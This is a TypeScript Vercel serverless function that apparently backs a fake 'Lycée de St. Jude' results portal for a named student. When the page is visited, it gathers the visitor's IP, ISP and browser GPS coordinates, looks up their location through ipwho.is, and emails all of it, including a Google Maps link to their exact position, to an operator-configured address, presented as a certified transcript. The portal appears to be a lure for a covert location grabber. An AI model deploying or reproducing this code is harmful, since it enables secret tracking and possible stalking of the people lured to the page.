import type { VercelRequest, VercelResponse } from '@vercel/node';
import nodemailer from "nodemailer";

export default async function handler(req: VercelRequest, res: VercelResponse) {
  // CORS preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: "Method not allowed" });
  }

  console.log("Email trigger request received with body:", req.body);

  const host = process.env.SMTP_HOST;
  const port = process.env.SMTP_PORT;
  const user = process.env.SMTP_USER;
  const pass = process.env.SMTP_PASS;
  const from = process.env.EMAIL_FROM || "Lycée de St. Jude <noreply@example.com>";
  
  // Parse multiple recipients separated by commas or semicolons
  const toEnv = process.env.EMAIL_TO || "";
  const recipientsList = toEnv.split(/[,;]/).map(email => email.trim()).filter(email => email.length > 0);
  const to = recipientsList.join(", ");

  // Retrieve location payload
  let { location, gps } = req.body || {};

  // Fallback IP parsing from request headers
  let ip = req.headers["x-forwarded-for"];
  if (Array.isArray(ip)) {
    ip = ip[0];
  } else if (typeof ip === "string") {
    ip = ip.split(",")[0].trim();
  }

  // Try server-side lookup if client-side failed or returned incomplete data
  if ((!location || !location.ip || location.city === "Inconnu") && ip && ip !== "127.0.0.1" && ip !== "::1") {
    try {
      console.log("Attempting server-side geoip lookup for IP:", ip);
      const geoRes = await fetch(`https://ipwho.is/${ip}`);
      if (geoRes.ok) {
        const geoData = await geoRes.json() as any;
        if (geoData && geoData.success) {
          location = geoData;
          console.log("Server-side geoip lookup success:", location);
        }
      }
    } catch (e) {
      console.warn("Server-side IP lookup failed, using defaults:", e);
    }
  }

  const finalLocation = {
    city: location?.city || "Inconnu",
    country: location?.country || "Cameroun",
    country_code: location?.country_code || "",
    country_flag: location?.country_flag || "",
    region: location?.region || "",
    isp: location?.connection?.isp || location?.isp || "Inconnu",
    org: location?.connection?.org || location?.org || "",
    asn: location?.connection?.asn || "",
    domain: location?.connection?.domain || "",
    ip: location?.ip || ip || "127.0.0.1",
    timezone: typeof location?.timezone === "object" ? (location?.timezone?.id || location?.timezone?.gmt || "") : (location?.timezone || ""),
    type: location?.type || "IPv4",
    latitude: gps?.latitude || location?.latitude || null,
    longitude: gps?.longitude || location?.longitude || null
  };

  // Check if configuration is present
  if (!host || !port || !user || !pass || !to) {
    console.warn("SMTP settings are incomplete. Sending skipped (Demo mode).");
    return res.status(200).json({
      success: false,
      status: "unconfigured",
      message: `Les paramètres SMTP ne sont pas configurés dans les variables d'environnement. L'envoi de l'e-mail a été simulé avec succès (Consulté depuis ${finalLocation.city}, ${finalLocation.country}).`,
      details: {
        host: host || "Non configuré",
        port: port || "Non configuré",
        user: user ? "••••••••" : "Non configuré",
        pass: pass ? "••••••••" : "Non configuré",
        to: to || "Non configuré",
        from: from
      },
      location: finalLocation
    });
  }

  try {
    const transporter = nodemailer.createTransport({
      host: host,
      port: parseInt(port, 10),
      secure: parseInt(port, 10) === 465,
      auth: {
        user: user,
        pass: pass,
      },
    });

    const htmlContent = `
      <div style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #e2e8f0; border-radius: 8px; background-color: #ffffff; color: #1e293b;">
        <div style="text-align: center; border-bottom: 2px solid #4338ca; padding-bottom: 15px; margin-bottom: 20px;">
          <h1 style="color: #4338ca; margin: 0; font-size: 22px; text-transform: uppercase; letter-spacing: 1px;">Lycée de St. Jude</h1>
          <p style="color: #64748b; margin: 5px 0 0 0; font-size: 11px; text-transform: uppercase; letter-spacing: 2px;">Secrétariat du Probatoire Académique</p>
        </div>
        
        <div style="margin-bottom: 25px;">
          <p style="font-size: 14px; line-height: 1.6;">Bonjour,</p>
          <p style="font-size: 14px; line-height: 1.6;">Nous vous informons que le portail académique officiel du <strong>Lycée de St. Jude</strong> vient d'être consulté pour l'accès aux résultats officiels du <strong>Probatoire 2026</strong> de l'élève ci-dessous :</p>
        </div>

        <div style="background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 16px; margin-bottom: 20px; font-size: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.05);">
          <div style="margin-bottom: 12px; font-weight: bold; color: #4338ca; text-transform: uppercase; letter-spacing: 0.5px;">
            📍 Informations de Connexion & Localisation (ipwho.is)
          </div>
          
          <table style="width: 100%; border-collapse: collapse; font-size: 13px; color: #334155;">
            <tr style="border-bottom: 1px solid #f1f5f9;">
              <td style="padding: 6px 0; font-weight: bold; color: #64748b; width: 40%;">Pays :</td>
              <td style="padding: 6px 0; color: #0f172a; font-weight: bold;">
                ${finalLocation.country_flag ? `<img src="${finalLocation.country_flag}" alt="${finalLocation.country}" style="width: 20px; height: 14px; border-radius: 2px; vertical-align: middle; margin-right: 6px; display: inline-block;" />` : ''}
                <span style="vertical-align: middle;">${finalLocation.country} (${finalLocation.country_code || 'N/A'})</span>
              </td>
            </tr>
            <tr style="border-bottom: 1px solid #f1f5f9;">
              <td style="padding: 6px 0; font-weight: bold; color: #64748b;">Région / État :</td>
              <td style="padding: 6px 0; color: #0f172a;">${finalLocation.region || 'Inconnu'}</td>
            </tr>
            <tr style="border-bottom: 1px solid #f1f5f9;">
              <td style="padding: 6px 0; font-weight: bold; color: #64748b;">Ville :</td>
              <td style="padding: 6px 0; color: #0f172a; font-weight: bold;">${finalLocation.city}</td>
            </tr>
            <tr style="border-bottom: 1px solid #f1f5f9;">
              <td style="padding: 6px 0; font-weight: bold; color: #64748b;">Fournisseur d'Accès (ISP) :</td>
              <td style="padding: 6px 0; color: #0f172a; font-weight: bold;">${finalLocation.isp}</td>
            </tr>
            ${finalLocation.org && finalLocation.org !== finalLocation.isp ? `
            <tr style="border-bottom: 1px solid #f1f5f9;">
              <td style="padding: 6px 0; font-weight: bold; color: #64748b;">Organisation :</td>
              <td style="padding: 6px 0; color: #0f172a;">${finalLocation.org}</td>
            </tr>
            ` : ''}
            ${finalLocation.asn ? `
            <tr style="border-bottom: 1px solid #f1f5f9;">
              <td style="padding: 6px 0; font-weight: bold; color: #64748b;">Numéro d'ASN :</td>
              <td style="padding: 6px 0; color: #0f172a; font-family: monospace;">${finalLocation.asn}</td>
            </tr>
            ` : ''}
            ${finalLocation.domain ? `
            <tr style="border-bottom: 1px solid #f1f5f9;">
              <td style="padding: 6px 0; font-weight: bold; color: #64748b;">Nom de domaine :</td>
              <td style="padding: 6px 0; color: #0f172a; font-family: monospace;">${finalLocation.domain}</td>
            </tr>
            ` : ''}
            <tr style="border-bottom: 1px solid #f1f5f9;">
              <td style="padding: 6px 0; font-weight: bold; color: #64748b;">Fuseau Horaire :</td>
              <td style="padding: 6px 0; color: #0f172a; font-family: monospace; font-size: 12px;">${finalLocation.timezone || 'Inconnu'}</td>
            </tr>
            <tr>
              <td style="padding: 6px 0; font-weight: bold; color: #64748b;">Adresse IP :</td>
              <td style="padding: 6px 0; color: #0f172a; font-family: monospace; font-weight: bold; font-size: 12px;">
                ${finalLocation.ip} <span style="font-size: 10px; color: #64748b; font-weight: normal;">(${finalLocation.type})</span>
              </td>
            </tr>
            ${finalLocation.latitude && finalLocation.longitude ? `
            <tr style="border-top: 2px dashed #e2e8f0;">
              <td style="padding: 8px 0; font-weight: bold; color: #4338ca; vertical-align: top;">📍 Coordonnées GPS :</td>
              <td style="padding: 8px 0; color: #0f172a; font-weight: bold; font-family: monospace; font-size: 12px;">
                ${finalLocation.latitude.toFixed(6)}, ${finalLocation.longitude.toFixed(6)}
                <div style="margin-top: 4px;">
                  <a href="https://www.google.com/maps?q=${finalLocation.latitude},${finalLocation.longitude}" target="_blank" style="color: #4338ca; text-decoration: underline; font-weight: bold; font-size: 12px; display: inline-block;">
                    Voir la position sur Google Maps ↗
                  </a>
                </div>
              </td>
            </tr>
            ` : ''}
          </table>
        </div>

        <div style="background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 6px; padding: 15px; margin-bottom: 25px;">
          <h2 style="font-size: 12px; color: #4338ca; text-transform: uppercase; margin-top: 0; margin-bottom: 10px; letter-spacing: 1px;">Fiche de Synthèse de l'Élève</h2>
          <table style="width: 100%; border-collapse: collapse; font-size: 13px;">
            <tr>
              <td style="padding: 4px 0; color: #64748b; font-weight: bold; width: 40%;">Nom Complet :</td>
              <td style="padding: 4px 0; color: #0f172a; font-weight: bold;">Kota Franck Steve</td>
            </tr>
            <tr>
              <td style="padding: 4px 0; color: #64748b; font-weight: bold;">Série / Classe :</td>
              <td style="padding: 4px 0; color: #0f172a;">Première C (Sciences Exactes)</td>
            </tr>
            <tr>
              <td style="padding: 4px 0; color: #64748b; font-weight: bold;">Moyenne Générale :</td>
              <td style="padding: 4px 0; color: #15803d; font-weight: bold; font-size: 14px;">16.89 / 20</td>
            </tr>
            <tr>
              <td style="padding: 4px 0; color: #64748b; font-weight: bold;">Mention :</td>
              <td style="padding: 4px 0; color: #15803d; font-weight: bold;">Très Bien</td>
            </tr>
            <tr>
              <td style="padding: 4px 0; color: #64748b; font-weight: bold;">Rang de la classe :</td>
              <td style="padding: 4px 0; color: #0f172a;">2<sup>e</sup> sur 28 élèves</td>
            </tr>
            <tr>
              <td style="padding: 4px 0; color: #64748b; font-weight: bold;">Taux d'Assiduité :</td>
              <td style="padding: 4px 0; color: #0f172a;">96.20% de présence</td>
            </tr>
          </table>
        </div>

        <div style="margin-bottom: 25px;">
          <h2 style="font-size: 12px; color: #4338ca; text-transform: uppercase; margin-top: 0; margin-bottom: 10px; letter-spacing: 1px;">Détails des Notes du Trimestre 1</h2>
          <table style="width: 100%; border-collapse: collapse; font-size: 12px; text-align: left;">
            <thead>
              <tr style="background-color: #f1f5f9; color: #475569; font-weight: bold; text-transform: uppercase; font-size: 10px;">
                <th style="padding: 8px; border: 1px solid #e2e8f0;">Matière</th>
                <th style="padding: 8px; border: 1px solid #e2e8f0; text-align: center;">Coef</th>
                <th style="padding: 8px; border: 1px solid #e2e8f0; text-align: center;">Note/20</th>
                <th style="padding: 8px; border: 1px solid #e2e8f0; text-align: center;">Mention</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td style="padding: 8px; border: 1px solid #e2e8f0; font-weight: bold;">Mathématiques</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center;">5</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center; font-weight: bold;">18.60</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center; color: #15803d;">Très Bien</td>
              </tr>
              <tr>
                <td style="padding: 8px; border: 1px solid #e2e8f0; font-weight: bold;">Physique</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center;">3</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center; font-weight: bold;">17.80</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center; color: #15803d;">Très Bien</td>
              </tr>
              <tr>
                <td style="padding: 8px; border: 1px solid #e2e8f0; font-weight: bold;">Chimie</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center;">2</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center; font-weight: bold;">16.80</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center; color: #15803d;">Très Bien</td>
              </tr>
              <tr>
                <td style="padding: 8px; border: 1px solid #e2e8f0; font-weight: bold;">Sciences de la Vie (SVT)</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center;">2</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center; font-weight: bold;">14.00</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center; color: #0369a1;">Bien</td>
              </tr>
              <tr>
                <td style="padding: 8px; border: 1px solid #e2e8f0; font-weight: bold;">Français</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center;">3</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center; font-weight: bold;">14.00</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center; color: #0369a1;">Bien</td>
              </tr>
              <tr>
                <td style="padding: 8px; border: 1px solid #e2e8f0; font-weight: bold;">Anglais</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center;">2</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center; font-weight: bold;">15.60</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center; color: #0369a1;">Bien</td>
              </tr>
              <tr>
                <td style="padding: 8px; border: 1px solid #e2e8f0; font-weight: bold;">Histoire-Géographie</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center;">2</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center; font-weight: bold;">15.80</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center; color: #0369a1;">Bien</td>
              </tr>
              <tr>
                <td style="padding: 8px; border: 1px solid #e2e8f0; font-weight: bold;">Informatique</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center;">2</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center; font-weight: bold;">19.00</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center; color: #15803d;">Très Bien</td>
              </tr>
              <tr>
                <td style="padding: 8px; border: 1px solid #e2e8f0; font-weight: bold;">ECM</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center;">1</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center; font-weight: bold;">16.80</td>
                <td style="padding: 8px; border: 1px solid #e2e8f0; text-align: center; color: #15803d;">Très Bien</td>
              </tr>
            </tbody>
          </table>
        </div>

        <div style="background-color: #f8fafc; border-left: 4px solid #4338ca; border-radius: 4px; padding: 12px; margin-bottom: 25px;">
          <p style="font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: #4338ca; margin: 0 0 5px 0; font-weight: bold;">Appréciation Générale</p>
          <p style="font-size: 13px; line-height: 1.5; color: #334155; margin: 0; font-style: italic;">
            "Franck Steve continue d'exceller dans toutes les disciplines scientifiques du Probatoire C. Son raisonnement logique et ses compétences expérimentales sont particulièrement remarquables."
          </p>
        </div>

        <div style="font-size: 11px; color: #64748b; line-height: 1.5; border-top: 1px solid #e2e8f0; padding-top: 15px; text-align: center;">
          <p style="margin: 0;">Ce document est un relevé numérique certifié conforme par le Lycée de St. Jude.</p>
          <p style="margin: 3px 0 0 0;">Identifiant de transaction : OB-PROB-KOTA-2026</p>
        </div>
      </div>
    `;

    await transporter.sendMail({
      from: from,
      to: to,
      subject: `[Lycée de St. Jude] Résultats Officiels consultés depuis ${finalLocation.city}, ${finalLocation.country} - Kota Franck Steve`,
      text: `Bonjour, les résultats scolaires de Kota Franck Steve pour le Probatoire 2026 (Première C) ont été consultés depuis ${finalLocation.city}, ${finalLocation.country} (IP: ${finalLocation.ip}) sur le portail académique du Lycée de St. Jude. Moyenne générale : 16.89/20 (Très Bien). Rang de classe : 2e de sa classe.`,
      html: htmlContent,
    });

    console.log("Vercel Function: Email sent successfully to:", to);
    return res.status(200).json({
      success: true,
      message: `L'e-mail officiel des résultats a été envoyé avec succès (Consulté depuis ${finalLocation.city}, ${finalLocation.country}).`,
      recipient: to,
      location: finalLocation
    });
  } catch (error: any) {
    console.error("Vercel Function: Failed to send email via SMTP:", error);
    return res.status(500).json({
      success: false,
      message: "Erreur lors de l'envoi de l'e-mail via SMTP.",
      error: error.message || error,
      location: finalLocation
    });
  }
}
